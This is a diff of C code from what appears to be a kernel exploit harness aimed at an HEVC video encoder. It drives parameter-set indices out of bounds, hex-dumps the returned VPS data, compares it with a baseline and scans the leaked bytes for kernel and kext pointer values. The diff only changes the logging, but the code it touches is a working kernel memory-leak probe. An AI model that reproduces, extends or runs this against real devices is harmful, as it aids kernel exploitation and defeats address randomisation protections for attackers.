@@ -7338,24 +7338,26 @@ vps_cd_done:
             encode_one(s, 0, vw, vh);
             for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
 
-            rlog("AID=%3d: set=%d prepare=%d encode=%d psets=%zu",
-                aid, (int)sp, 0, (int)g_cb_status, g_last_pset_count);
+            rlog("AID=%3d: set=%d prepare=%d encode=%d psets=%zu done=%d",
+                aid, (int)sp, 0, (int)g_cb_status, g_last_pset_count, g_encode_done);
 
-            if (g_saved_fmt && g_last_pset_count > 0) {
-                /* Dump ALL parameter sets */
+            rlog(" fmt=%s", g_saved_fmt ? "YES" : "NO");
+            if (g_saved_fmt) {
                 size_t pcount = 0;
-                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                OSStatus pc_st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                     g_saved_fmt, 0, NULL, NULL, &pcount, NULL);
+                rlog(" pcount=%zu(st=%d)", pcount, (int)pc_st);
 
                 for (size_t pi = 0; pi < pcount && pi < 10; pi++) {
                     const uint8_t *ptr = NULL;
                     size_t sz = 0;
                     int nal_hdr = 0;
-                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                    OSStatus gs = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                         g_saved_fmt, pi, &ptr, &sz, NULL, &nal_hdr);
-                    if (!ptr || sz == 0) continue;
+                    rlog("\n  pset[%zu] nal=%d len=%zu st=%d ptr=%s: ",
+                        pi, nal_hdr, sz, (int)gs, ptr ? "OK" : "NULL");
+                    if (!ptr || sz == 0) { rlog("(empty)"); continue; }
 
-                    rlog("\n  pset[%zu] nal=%d len=%zu: ", pi, nal_hdr, sz);
                     size_t dlen = (sz > 128) ? 128 : sz;
                     for (size_t j = 0; j < dlen; j++) {
                         rlog("%02x", ptr[j]);
@@ -7364,45 +7366,40 @@ vps_cd_done:
                     }
                     if (dlen < sz) rlog("... +%zu", sz - dlen);
 
-                    /* Compare with baseline if same pset index 0 */
                     if (pi == 0 && baseline_len > 0 && sz > 0) {
                         size_t cmp_len = (sz < baseline_len) ? sz : baseline_len;
                         int diffs = 0;
-                        rlog("\n  DIFF vs baseline: ");
+                        rlog("\n  DIFF: ");
                         for (size_t j = 0; j < cmp_len; j++) {
                             if (ptr[j] != baseline_vps[j]) {
-                                rlog("[%zu]=%02x→%02x ", j, baseline_vps[j], ptr[j]);
+                                rlog("[%zu]=%02x>%02x ", j, baseline_vps[j], ptr[j]);
                                 diffs++;
                             }
                         }
                         if (sz != baseline_len)
-                            rlog("LEN:%zu→%zu ", baseline_len, sz);
+                            rlog("LEN:%zu>%zu ", baseline_len, sz);
                         if (diffs == 0 && sz == baseline_len)
                             rlog("(identical)");
-                        else
-                            rlog("(%d byte diffs)", diffs);
-
-                        /* Check for suspicious leaked values */
-                        if (aid >= 64 && diffs > 0) {
-                            rlog("\n  *** OOB INDEX %d: leaked %d bytes of kernel heap data ***", aid, diffs);
-                            /* Scan for pointer-like values */
-                            if (sz >= 8) {
-                                for (size_t j = 0; j <= sz - 8; j += 4) {
-                                    uint64_t qw;
-                                    memcpy(&qw, ptr + j, 8);
-                                    if ((qw >> 40) == 0xfffffe) {
-                                        rlog("\n  *** KERNEL PTR at byte %zu: 0x%016llx ***",
-                                            j, (unsigned long long)qw);
-                                    }
-                                    if ((qw >> 40) == 0xffff80) {
-                                        rlog("\n  *** KEXT PTR at byte %zu: 0x%016llx ***",
-                                            j, (unsigned long long)qw);
+                        else {
+                            rlog("(%d diffs)", diffs);
+                            if (aid >= 64) {
+                                rlog("\n  *** OOB INDEX %d: %d bytes of kernel data ***", aid, diffs);
+                                if (sz >= 8) {
+                                    for (size_t j = 0; j <= sz - 8; j += 4) {
+                                        uint64_t qw;
+                                        memcpy(&qw, ptr + j, 8);
+                                        if ((qw >> 40) == 0xfffffe)
+                                            rlog("\n  *** KPTR byte %zu: 0x%016llx ***", j, (unsigned long long)qw);
+                                        if ((qw >> 40) == 0xffff80)
+                                            rlog("\n  *** XPTR byte %zu: 0x%016llx ***", j, (unsigned long long)qw);
                                     }
                                 }
                             }
                         }
                     }
                 }
+            } else {
+                rlog(" (no format description)");
             }
             rlog("\n\n");
 
